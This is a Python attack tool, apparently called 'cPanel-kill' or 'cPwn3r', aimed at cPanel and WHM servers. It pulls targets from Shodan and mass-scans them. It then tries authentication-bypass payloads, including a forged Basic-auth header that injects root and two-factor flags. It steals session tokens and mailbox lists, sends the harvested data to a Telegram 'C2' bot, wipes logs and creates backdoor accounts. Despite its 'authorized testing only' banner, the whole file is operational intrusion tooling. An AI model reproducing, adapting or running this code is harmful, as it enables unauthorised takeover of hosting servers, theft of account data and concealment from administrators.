#!/usr/bin/env python3

import sys
import os
import re
import time
import json
import socket
import sqlite3
import threading
import logging
import base64
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse
from filelock import FileLock

try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except ImportError:
    import requests
    HAS_CURL_CFFI = False

try:
    import pyfiglet
    HAS_PYFIGLET = True
except ImportError:
    HAS_PYFIGLET = False

import urllib3
import whois
from colorama import init, Fore
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

CPANEL_PORTS = [2082, 2083, 2086, 2087, 2095, 2096]
WHM_PORTS = [2086, 2087]
FAST_PORTS = [2087, 2083]
SCAN_THREADS = 50
EXPLOIT_THREADS = 20
TIMEOUT = 10
RETRIES = 3
MAX_RETRIES = 3
FAST_TIMEOUT = 3
VERIFY_TIMEOUT = 2
SESSIONS_FILE = "sessions.json"
SESSIONS_LOCK = FileLock(SESSIONS_FILE + ".lock")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
DEBUG = False

def get_session():
    if HAS_CURL_CFFI:
        session = cffi_requests.Session(impersonate="chrome120", verify=False)
    else:
        session = requests.Session()
        session.verify = False
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    return session

def request_with_retry(method, url, **kwargs):
    global DEBUG
    for attempt in range(RETRIES):
        try:
            if DEBUG:
                logger.debug(f"REQUEST: {method} {url}")
                if 'headers' in kwargs:
                    logger.debug(f"Headers: {kwargs['headers']}")
                if 'data' in kwargs:
                    logger.debug(f"Data: {kwargs['data']}")
            session = kwargs.pop('session', get_session())
            resp = session.request(method, url, timeout=TIMEOUT, **kwargs)
            if DEBUG:
                logger.debug(f"RESPONSE {resp.status_code}: {resp.text[:500]}")
            return resp
        except Exception as e:
            logger.warning(f"Request attempt {attempt+1}/{RETRIES} failed: {e}")
            time.sleep(1)
    return None

def check_port(host, port, timeout=TIMEOUT):
    try:
        addrs = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
        for family, _, _, _, addr in addrs:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            try:
                result = sock.connect_ex(addr)
                sock.close()
                if result == 0:
                    return True
            except:
                continue
        return False
    except:
        return False

def verify_cpanel(host, port):
    scheme = "https" if port in [2083, 2087, 2096] else "http"
    url = f"{scheme}://{host}:{port}/"
    try:
        session = get_session()
        resp = session.head(url, timeout=VERIFY_TIMEOUT, allow_redirects=True)
        if resp.status_code in [200, 302, 401, 403]:
            server = resp.headers.get('Server', '')
            if 'cpanel' in server.lower():
                return True
            set_cookie = resp.headers.get('Set-Cookie', '')
            if 'cpsess' in set_cookie.lower() or 'cpanel' in set_cookie.lower():
                return True
        return False
    except:
        return False

def scan_single_fast(target):
    host = target.split(':')[0]
    if ':' in target:
        try:
            port = int(target.split(':')[1])
            if check_port(host, port, timeout=FAST_TIMEOUT):
                if verify_cpanel(host, port):
                    return host, port, "Open"
                return host, port, "Unknown"
            return host, port, "Closed"
        except:
            pass
    for port in FAST_PORTS:
        if check_port(host, port, timeout=FAST_TIMEOUT):
            if verify_cpanel(host, port):
                return host, port, "Open"
            return host, port, "Unknown"
    return host, None, "Closed"

def scan_targets(targets, threads=SCAN_THREADS):
    logger.info(f"Scanning {len(targets)} targets with {threads} threads...")
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_single_fast, t): t for t in targets}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Filtering"):
            host, port, status = future.result()
            if status == "Open":
                print(Fore.GREEN + f"[+] {host}:{port} - OPEN")
                results.append((host, port))
            else:
                print(Fore.RED + f"[-] {host} - {status}")
    return results

def get_cpanel_version(host, port):
    endpoints = [
        (f"/json-api/version", "json"),
        (f"/version", "text"),
        (f"/cgi-sys/entropybanner.cgi", "html")
    ]
    scheme = "https" if port not in [2082, 2095] else "http"
    for path, resp_type in endpoints:
        url = f"{scheme}://{host}:{port}{path}"
        try:
            session = get_session()
            resp = session.get(url, timeout=TIMEOUT)
            if resp.status_code == 200:
                if resp_type == "json":
                    data = resp.json()
                    version = data.get('version', {}).get('version')
                    if version:
                        return version
                elif resp_type == "html":
                    match = re.search(r'cPanel\s+(\d+\.\d+\.\d+)', resp.text, re.I)
                    if match:
                        return match.group(1)
                else:
                    match = re.search(r'(\d+\.\d+\.\d+)', resp.text)
                    if match:
                        return match.group(1)
        except:
            continue
    return None

def exploit_graphql(host, port):
    scheme = "https" if port not in [2082, 2095] else "http"
    base = f"{scheme}://{host}:{port}"
    url = f"{base}/graphql"
    session = get_session()
    try:
        probe = session.get(url, timeout=TIMEOUT)
        if probe.status_code not in [200, 400, 405]:
            return {"status": "GraphQL_Not_Available", "token": None}
    except:
        return {"status": "GraphQL_Error", "token": None}
    payload = {
        "query": "query { __type(name: \"__schema\") { name } }",
        "variables": None,
        "operationName": None
    }
    headers = {"Content-Type": "application/json", "X-Forwarded-For": "127.0.0.1"}
    try:
        resp = session.post(url, json=payload, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            if "errors" in data:
                for err in data["errors"]:
                    if "cpsession" in err.get("message", ""):
                        token = re.search(r'cpsession=([^;]+)', err["message"])
                        if token:
                            return {"status": "Exploited", "token": token.group(1), "cookie_name": "cpsession"}
        if "Set-Cookie" in resp.headers:
            cookie = resp.headers["Set-Cookie"]
            match = re.search(r'cpsession=([^;]+)', cookie)
            if match:
                return {"status": "Exploited", "token": match.group(1), "cookie_name": "cpsession"}
    except:
        pass
    return {"status": "GraphQL_Failed", "token": None}

def exploit_legacy(host, port):
    scheme = "https" if port not in [2082, 2095] else "http"
    base_url = f"{scheme}://{host}:{port}"
    session = get_session()
    resp = request_with_retry("GET", f"{base_url}/cpanel/", session=session)
    if not resp or resp.status_code not in [200, 302]:
        return {"status": "Stage1_Failed", "token": None}
    cookie_name = None
    if "Set-Cookie" in resp.headers:
        for cookie in resp.headers.get("Set-Cookie").split(","):
            if "cpsession" in cookie.lower():
                cookie_name = "cpsession"
                break
    if not cookie_name:
        for cookie in session.cookies:
            if re.search(r'[0-9a-f]{32}', cookie.name) or cookie.name.lower().startswith('cpsess'):
                cookie_name = cookie.name
                break
    if not cookie_name:
        return {"status": "No_Cookie", "token": None}
    payload_lines = [
        "root:somepass",
        "user=root",
        "hasroot=1",
        "tfa_verified=1",
        "successful_internal_auth_with_timestamp=9999999999"
    ]
    payload = "\r\n".join(payload_lines)
    auth_b64 = base64.b64encode(payload.encode()).decode()
    headers = {"Authorization": f"Basic {auth_b64}"}
    resp2 = request_with_retry("GET", f"{base_url}/cpanel/", session=session, headers=headers)
    if not resp2:
        return {"status": "Stage2_Failed", "token": None}
    resp3 = request_with_retry("GET", f"{base_url}/cpanel/", session=session)
    if not resp3:
        return {"status": "Stage3_Failed", "token": None}
    resp4 = request_with_retry("GET", f"{base_url}/json-api/version", session=session)
    if resp4 and resp4.status_code == 200:
        try:
            data = resp4.json()
            token_value = session.cookies.get(cookie_name)
            if token_value:
                return {"status": "Exploited", "token": token_value, "cookie_name": cookie_name,
                        "version": data.get('version', {}).get('version')}
        except:
            pass
    return {"status": "Verify_Failed", "token": None}

def validate_session(host, port, cookie_name, token):
    scheme = "https" if port not in [2082, 2095] else "http"
    url = f"{scheme}://{host}:{port}/json-api/version"
    session = get_session()
    session.cookies.set(cookie_name, token)
    try:
        resp = session.get(url, timeout=TIMEOUT)
        return resp.status_code == 200
    except:
        return False

def exploit_cpanel(host, port):
    methods = [
        ("GraphQL", exploit_graphql),
        ("Legacy", exploit_legacy)
    ]
    result = None
    for name, func in methods:
        logger.info(f"Trying {name} exploit on {host}:{port}")
        result = func(host, port)
        if result and result.get("status") == "Exploited":
            result["method"] = name
            return result
        if result and result.get("token"):
            pass
    return result or {"status": "All_Methods_Failed", "token": None}

def extract_whois_emails(domain):
    try:
        w = whois.whois(domain, timeout=10)
        emails = []
        if w.emails:
            emails.extend(w.emails if isinstance(w.emails, list) else [w.emails])
        if w.registrant_email:
            emails.append(w.registrant_email)
        if w.admin_email:
            emails.append(w.admin_email)
        return list(set([e.lower() for e in emails if e and '@' in e]))
    except:
        return []

def extract_emails(host, port, cookie_name, token):
    emails = []
    try:
        if port in WHM_PORTS:
            scheme = "https"
            base = f"{scheme}://{host}:{port}"
            session = get_session()
            session.cookies.set(cookie_name, token)
            resp = request_with_retry("GET", f"{base}/json-api/listaccts", session=session)
            if resp and resp.status_code == 200:
                data = resp.json()
                users = [acct['user'] for acct in data.get('data', {}).get('acct', [])]
                domain = host.split(':')[0]
                if users and 'domain' in data.get('data', {}).get('acct', [{}])[0]:
                    domain = data['data']['acct'][0]['domain']
                emails = [f"{u}@{domain}" for u in users]
        else:
            scheme = "https" if port not in [2082, 2095] else "http"
            base = f"{scheme}://{host}:{port}"
            session = get_session()
            session.cookies.set(cookie_name, token)
            url = f"{base}/json-api/Email"
            params = {
                "api.version": "1",
                "cpanel_jsonapi_func": "listpopswithdisk",
                "cpanel_jsonapi_apiversion": "2",
            }
            resp = request_with_retry("GET", url, session=session, params=params)
            if resp and resp.status_code == 200:
                data = resp.json()
                emails = [item.get('email') for item in data.get('cpanelresult', {}).get('data', []) if item.get('email')]
    except Exception as e:
        logger.warning(f"Error extracting emails from {host}: {e}")
    if not emails:
        emails = extract_whois_emails(host.split(':')[0])
    return emails

def clean_logs(host, port, cookie_name, token):
    if port not in WHM_PORTS:
        logger.warning("Log cleanup only supported via WHM ports (2086/2087)")
        return False
    scheme = "https"
    base = f"{scheme}://{host}:{port}"
    session = get_session()
    session.cookies.set(cookie_name, token)
    try:
        resp = request_with_retry("GET", f"{base}/json-api/listaccts", session=session)
        if resp and resp.status_code == 200:
            data = resp.json()
            users = [acct['user'] for acct in data.get('data', {}).get('acct', [])]
            for user in users:
                clear_url = f"{base}/json-api/clear_bandwidth"
                params = {"user": user}
                request_with_retry("GET", clear_url, session=session, params=params)
            logger.info(f"Cleared logs for {len(users)} accounts on {host}")
            return True
    except Exception as e:
        logger.error(f"Log cleanup failed on {host}: {e}")
    return False

class Database:
    def __init__(self, db_path="targets.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.cursor = self.conn.cursor()
        self._create_tables()
        self.lock = threading.Lock()

    def _create_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host TEXT NOT NULL,
                port INTEGER,
                status TEXT,
                scanned INTEGER DEFAULT 0,
                exploited INTEGER DEFAULT 0,
                emails TEXT,
                token TEXT,
                cookie_name TEXT,
                version TEXT,
                last_exploit_attempt TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        for col in ['token', 'cookie_name', 'version', 'last_exploit_attempt']:
            try:
                self.cursor.execute(f"ALTER TABLE targets ADD COLUMN {col} TEXT")
            except sqlite3.OperationalError:
                pass
        self.conn.commit()

    def add_target(self, host, port=None):
        with self.lock:
            self.cursor.execute(
                "INSERT OR IGNORE INTO targets (host, port) VALUES (?, ?)",
                (host, port)
            )
            self.conn.commit()

    def get_pending_targets(self):
        with self.lock:
            self.cursor.execute(
                "SELECT id, host, port FROM targets WHERE scanned = 0"
            )
            return self.cursor.fetchall()

    def get_exploitable_targets(self):
        with self.lock:
            self.cursor.execute(
                "SELECT id, host, port, token, cookie_name FROM targets "
                "WHERE scanned = 1 AND exploited = 0 AND port IS NOT NULL"
            )
            return self.cursor.fetchall()

    def update_scan(self, target_id, status, port=None):
        with self.lock:
            if port is not None:
                self.cursor.execute(
                    "UPDATE targets SET status = ?, scanned = 1, port = ? WHERE id = ?",
                    (status, port, target_id)
                )
            else:
                self.cursor.execute(
                    "UPDATE targets SET status = ?, scanned = 1 WHERE id = ?",
                    (status, target_id)
                )
            self.conn.commit()

    def update_exploit(self, target_id, status, exploited, token=None, cookie_name=None, version=None, emails=None, attempt=None):
        with self.lock:
            self.cursor.execute(
                """UPDATE targets SET status = ?, exploited = ?, token = ?, cookie_name = ?,
                   version = ?, emails = ?, last_exploit_attempt = ? WHERE id = ?""",
                (status, exploited, token, cookie_name, version,
                 json.dumps(emails) if emails else None, attempt, target_id)
            )
            self.conn.commit()

    def update_port(self, target_id, port):
        with self.lock:
            self.cursor.execute(
                "UPDATE targets SET port = ? WHERE id = ?",
                (port, target_id)
            )
            self.conn.commit()

    def get_results(self):
        with self.lock:
            self.cursor.execute(
                "SELECT host, port, status, exploited, emails, token, cookie_name FROM targets WHERE scanned = 1"
            )
            return self.cursor.fetchall()

    def get_exploited_sessions(self):
        with self.lock:
            self.cursor.execute(
                "SELECT host, port, token, cookie_name FROM targets WHERE exploited = 1 AND token IS NOT NULL"
            )
            return self.cursor.fetchall()

    def close(self):
        self.conn.close()

def load_sessions():
    try:
        with SESSIONS_LOCK:
            if os.path.exists(SESSIONS_FILE):
                with open(SESSIONS_FILE, 'r') as f:
                    return json.load(f)
    except Exception:
        pass
    return {}

def save_sessions(sessions):
    try:
        with SESSIONS_LOCK:
            with open(SESSIONS_FILE, 'w') as f:
                json.dump(sessions, f, indent=2)
    except Exception:
        pass

class ShodanScanner:
    def __init__(self, api_key=None):
        self.api_key = api_key or os.getenv("SHODAN_API_KEY")

    def search(self, query="port:2087 cpanel", pages=1):
        if not self.api_key:
            print(Fore.RED + "[-] Shodan API key not configured. Set SHODAN_API_KEY env var.")
            return []
        try:
            import shodan
            api = shodan.Shodan(self.api_key)
            results = []
            for page in range(1, pages + 1):
                print(Fore.BLUE + f"[*] Fetching Shodan page {page}...")
                response = api.search(query, page=page)
                for result in response['matches']:
                    host = result.get('ip_str')
                    port = result.get('port')
                    if host and port:
                        results.append((host, port))
            print(Fore.GREEN + f"[+] Found {len(results)} targets from Shodan.")
            return results
        except ImportError:
            print(Fore.RED + "[-] Shodan library not installed. Install with: pip install shodan")
            return []
        except Exception as e:
            print(Fore.RED + f"[-] Shodan error: {e}")
            return []

def export_results(results, filename="results.json"):
    export_data = []
    for row in results:
        host, port, status, exploited, emails_json, token, cookie_name = row
        emails = json.loads(emails_json) if emails_json else []
        export_data.append({
            "host": host,
            "port": port,
            "status": status,
            "exploited": bool(exploited),
            "emails": emails,
            "token": token,
            "cookie_name": cookie_name,
            "timestamp": datetime.now().isoformat()
        })
    with open(filename, 'w') as f:
        json.dump(export_data, f, indent=2)
    txt_file = "emails.txt"
    with open(txt_file, 'w') as f:
        for entry in export_data:
            f.write(f"=== {entry['host']} ===\n")
            for email in entry['emails']:
                f.write(email + "\n")
            f.write("\n")
    logger.info(f"Results exported to {filename} and {txt_file}")
    return txt_file

def print_banner():
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    RESET = '\033[0m'

    if HAS_PYFIGLET:
        try:
            banner_text = pyfiglet.figlet_format("cPanel-kill", font="slant")
            print(RED + banner_text + RESET)
        except Exception:
            print(RED + "  _____  ____        _   _ _____ " + RESET)
            print(RED + " |  __ \/ __ \      | \ | |_   _|" + RESET)
            print(RED + " | |__) | |  | |_ __|  \| | | |  " + RESET)
            print(RED + " |  ___/| |  | | '__| . ` | | |  " + RESET)
            print(RED + " | |    | |__| | |  | |\  |_| |_ " + RESET)
            print(RED + " |_|     \____/|_|  |_| \_|_____|" + RESET)
    else:
        print(RED + "  _____  ____        _   _ _____ " + RESET)
        print(RED + " |  __ \/ __ \      | \ | |_   _|" + RESET)
        print(RED + " | |__) | |  | |_ __|  \| | | |  " + RESET)
        print(RED + " |  ___/| |  | | '__| . ` | | |  " + RESET)
        print(RED + " | |    | |__| | |  | |\  |_| |_ " + RESET)
        print(RED + " |_|     \____/|_|  |_| \_|_____|" + RESET)

    print(YELLOW + "=" * 70 + RESET)
    print(GREEN + "  Red Team cPanel Exploitation Framework v3.0" + RESET)
    print(RED + "  FOR AUTHORIZED TESTING ONLY!" + RESET)
    print(RED + "  Unauthorized use is a FEDERAL CRIME." + RESET)
    print(YELLOW + "=" * 70 + "\n" + RESET)

class TelegramC2:
    def __init__(self, bot_token=None, chat_id=None):
        self.bot_token = bot_token or os.getenv("TELEGRAM_BOT_TOKEN")
        self.chat_id = chat_id or os.getenv("TELEGRAM_CHAT_ID")

    def configure(self):
        print(Fore.CYAN + "\n[ Telegram C2 Configuration ]")
        self.bot_token = input("Enter Telegram Bot Token: ").strip() or self.bot_token
        self.chat_id = input("Enter Telegram Chat ID: ").strip() or self.chat_id
        if self.bot_token and self.chat_id:
            print(Fore.GREEN + "[+] Telegram configured.")
            return True
        return False

    def send(self, message, document_path=None):
        if not self.bot_token or not self.chat_id:
            logger.warning("Telegram not configured.")
            return False
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            resp = requests.post(url, data=payload, timeout=5)
            if resp.status_code != 200:
                logger.error(f"Telegram send error: {resp.text}")
                return False
        except Exception as e:
            logger.error(f"Telegram send failed: {e}")
            return False
        if document_path and os.path.exists(document_path):
            url_doc = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(document_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id}
                try:
                    resp = requests.post(url_doc, files=files, data=data, timeout=10)
                    if resp.status_code == 200:
                        logger.info("Telegram document sent.")
                    else:
                        logger.error(f"Telegram doc error: {resp.text}")
                except Exception as e:
                    logger.error(f"Telegram doc failed: {e}")
        logger.info("Telegram notification sent.")
        return True

class CPwn3rApp:
    def __init__(self):
        self.db = Database()
        self.telegram = TelegramC2()
        self.shodan_key = os.getenv("SHODAN_API_KEY")
        self.sessions = load_sessions()
        self.sessions_lock = threading.Lock()
        self.debug = False

    def run(self):
        print_banner()
        self._main_menu()

    def _main_menu(self):
        while True:
            print(Fore.CYAN + "\n" + "=" * 50)
            print(Fore.CYAN + "[ MAIN MENU ]")
            print("1. Load targets from file")
            print("2. Add single target")
            print("3. Shodan discovery")
            print("4. Scan targets")
            print("5. Exploit & extract emails")
            print("6. Configure Telegram C2")
            print("7. Export results")
            print("8. Send results via Telegram")
            print("9. Clean logs (post-exploit)")
            print("10. Toggle debug mode")
            print("11. Post-exploit actions (list accounts, backdoor)")
            print("12. Exit")
            choice = input(Fore.WHITE + "Select: ").strip()

            if choice == '1':
                self._load_targets()
            elif choice == '2':
                self._add_target()
            elif choice == '3':
                self._shodan_discovery()
            elif choice == '4':
                self._scan_targets()
            elif choice == '5':
                self._exploit_targets()
            elif choice == '6':
                self.telegram.configure()
            elif choice == '7':
                self._export_results()
            elif choice == '8':
                self._send_telegram()
            elif choice == '9':
                self._clean_logs()
            elif choice == '10':
                self.debug = not self.debug
                global DEBUG
                DEBUG = self.debug
                print(Fore.GREEN + f"[+] Debug mode {'ON' if self.debug else 'OFF'}")
            elif choice == '11':
                self._post_exploit()
            elif choice == '12':
                print(Fore.CYAN + "[*] Goodbye.")
                self.db.close()
                sys.exit(0)
            else:
                print(Fore.RED + "[-] Invalid option.")

    def _load_targets(self):
        filepath = input("Enter target file path: ").strip()
        if not os.path.exists(filepath):
            print(Fore.RED + f"[-] File {filepath} not found.")
            return
        with open(filepath, 'r') as f:
            lines = f.read().strip().splitlines()
        count = 0
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '://' in line:
                line = line.split('://')[1]
            if '/' in line:
                line = line.split('/')[0]
            if ':' in line:
                host, port = line.split(':')
                self.db.add_target(host, int(port))
            else:
                self.db.add_target(line)
            count += 1
        print(Fore.GREEN + f"[+] Loaded {count} targets into database.")

    def _add_target(self):
        target = input("Enter target (IP or domain[:port]): ").strip()
        if ':' in target:
            host, port = target.split(':')
            self.db.add_target(host, int(port))
        else:
            self.db.add_target(target)
        print(Fore.GREEN + f"[+] Added {target}")

    def _shodan_discovery(self):
        if not self.shodan_key:
            self.shodan_key = input("Enter Shodan API key: ").strip()
        scanner = ShodanScanner(self.shodan_key)
        query = input("Enter Shodan search query (default: port:2087 cpanel): ").strip()
        if not query:
            query = "port:2087 cpanel"
        pages = int(input("Enter number of pages to fetch (default: 1): ").strip() or "1")
        results = scanner.search(query, pages)
        for host, port in results:
            self.db.add_target(host, port)
        print(Fore.GREEN + f"[+] Added {len(results)} targets from Shodan.")

    def _scan_targets(self):
        pending = self.db.get_pending_targets()
        if not pending:
            print(Fore.RED + "[-] No pending targets. Load targets first.")
            return
        targets = [f"{host}:{port}" if port else host for _, host, port in pending]
        alive = scan_targets(targets, SCAN_THREADS)
        for host, port in alive:
            for tid, db_host, db_port in pending:
                if db_host == host:
                    self.db.update_port(tid, port)
                    self.db.update_scan(tid, "Open", port)
                    break
        alive_hosts = set(h for h, _ in alive)
        for tid, host, port in pending:
            if host not in alive_hosts:
                self.db.update_scan(tid, "Closed")
        print(Fore.GREEN + f"[+] Found {len(alive)} live cPanel hosts.")

    def _exploit_targets(self):
        targets = self.db.get_exploitable_targets()
        if not targets:
            print(Fore.RED + "[-] No targets to exploit. Scan first.")
            return
        sessions = load_sessions()
        filtered = []
        for tid, host, port, token, cookie in targets:
            key = f"{host}:{port}"
            if key in sessions:
                sess_data = sessions[key]
                if validate_session(host, port, sess_data.get('cookie_name', cookie), sess_data.get('token')):
                    token = sess_data['token']
                    cookie = sess_data.get('cookie_name')
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie)
                    emails = extract_emails(host, port, cookie, token)
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie, emails=emails)
                    print(Fore.GREEN + f"[*] Reused valid session for {host}:{port} ({len(emails)} emails)")
                    continue
                else:
                    del sessions[key]
                    save_sessions(sessions)
            if token and cookie:
                if validate_session(host, port, cookie, token):
                    emails = extract_emails(host, port, cookie, token)
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie, emails=emails)
                    with self.sessions_lock:
                        sessions[key] = {'token': token, 'cookie_name': cookie, 'timestamp': datetime.now().isoformat()}
                        save_sessions(sessions)
                    print(Fore.GREEN + f"[*] Reused DB session for {host}:{port} ({len(emails)} emails)")
                    continue
            filtered.append((tid, host, port, token, cookie))
        if not filtered:
            print(Fore.GREEN + "[+] All targets already exploited or have valid sessions.")
            return
        print(Fore.BLUE + f"[*] Exploiting {len(filtered)} new targets...")
        max_workers = min(EXPLOIT_THREADS, len(filtered))
        results = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for tid, host, port, _, _ in filtered:
                futures[executor.submit(exploit_cpanel, host, port)] = (tid, host, port)
            for future in tqdm(as_completed(futures), total=len(futures), desc="Exploiting"):
                tid, host, port = futures[future]
                result = future.result()
                status = result.get('status', 'Cant_Access')
                token = result.get('token')
                cookie_name = result.get('cookie_name')
                version = result.get('version')
                discovered_port = result.get('port', port)
                method = result.get('method', 'Unknown')
                if status == 'Exploited' and token:
                    print(Fore.GREEN + f"[+] Exploited {host}:{discovered_port} via {method}")
                    if discovered_port != port:
                        self.db.update_port(tid, discovered_port)
                    key = f"{host}:{discovered_port}"
                    with self.sessions_lock:
                        sessions[key] = {
                            'token': token,
                            'cookie_name': cookie_name,
                            'version': version,
                            'timestamp': datetime.now().isoformat()
                        }
                        save_sessions(sessions)
                    emails = extract_emails(host, discovered_port, cookie_name, token)
                    if emails:
                        print(Fore.GREEN + f"[+] Found {len(emails)} emails")
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie_name, version, emails, method)
                    results.append((host, discovered_port, status, emails))
                else:
                    print(Fore.RED + f"[-] {host}:{port} - {status}")
                    self.db.update_exploit(tid, status, 0, attempt=method)
        print(Fore.GREEN + f"[+] Exploited {len(results)} hosts.")

    def _clean_logs(self):
        sessions = load_sessions()
        if not sessions:
            print(Fore.RED + "[-] No saved sessions. Exploit first.")
            return
        print(Fore.BLUE + "[*] Cleaning logs for all exploited targets...")
        for key, data in sessions.items():
            host, port_str = key.split(':')
            port = int(port_str)
            token = data.get('token')
            cookie = data.get('cookie_name')
            if clean_logs(host, port, cookie, token):
                print(Fore.GREEN + f"[+] Logs cleaned for {host}")
            else:
                print(Fore.RED + f"[-] Failed to clean logs for {host}")

    def _export_results(self):
        results = self.db.get_results()
        if not results:
            print(Fore.RED + "[-] No results to export.")
            return
        export_results(results)
        print(Fore.GREEN + "[+] Results exported.")

    def _send_telegram(self):
        results = self.db.get_results()
        if not results:
            print(Fore.RED + "[-] No results to send.")
            return
        msg = "<b>cPwn3r Results</b>\n"
        msg += f"Total targets: {len(results)}\n"
        exploited = [r for r in results if r[3] == 1]
        msg += f"Exploited: {len(exploited)}\n\n"
        temp_file = "telegram_export.txt"
        with open(temp_file, 'w') as f:
            for row in results:
                host, port, status, exploited_flag, emails_json, token, cookie = row
                emails = json.loads(emails_json) if emails_json else []
                f.write(f"{host}:{port} - Exploited: {bool(exploited_flag)}\n")
                if emails:
                    f.write("  Emails:\n")
                    for e in emails:
                        f.write(f"    {e}\n")
                f.write("\n")
        self.telegram.send(msg, document_path=temp_file)
        os.remove(temp_file)

    def _post_exploit(self):
        sessions = load_sessions()
        if not sessions:
            print(Fore.RED + "[-] No saved sessions.")
            return
        print(Fore.BLUE + "[*] Post-exploit actions:")
        for key, data in sessions.items():
            host, port_str = key.split(':')
            port = int(port_str)
            token = data.get('token')
            cookie = data.get('cookie_name')
            if port not in WHM_PORTS:
                print(Fore.YELLOW + f"[!] {host} not on WHM port, skipping advanced actions.")
                continue
            scheme = "https"
            base = f"{scheme}://{host}:{port}"
            session = get_session()
            session.cookies.set(cookie, token)
            resp = request_with_retry("GET", f"{base}/json-api/listaccts", session=session)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    accounts = data.get('data', {}).get('acct', [])
                    print(Fore.GREEN + f"[+] Accounts on {host}:")
                    for acct in accounts:
                        print(f"  {acct.get('user')} ({acct.get('domain')})")
                    choice = input(f"Create backdoor user on {host}? (y/n): ").strip().lower()
                    if choice == 'y':
                        username = input("Enter username: ").strip()
                        password = input("Enter password: ").strip()
                        domain = input("Enter domain: ").strip()
                        create_url = f"{base}/json-api/createacct"
                        params = {
                            "username": username,
                            "password": password,
                            "domain": domain,
                            "plan": "default"
                        }
                        resp2 = request_with_retry("GET", create_url, session=session, params=params)
                        if resp2 and resp2.status_code == 200:
                            print(Fore.GREEN + f"[+] Backdoor user {username} created.")
                        else:
                            print(Fore.RED + f"[-] Failed to create backdoor.")
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")
            else:
                print(Fore.RED + f"[-] Could not list accounts for {host}")

if __name__ == "__main__":
    try:
        app = CPwn3rApp()
        app.run()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted by user.")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)
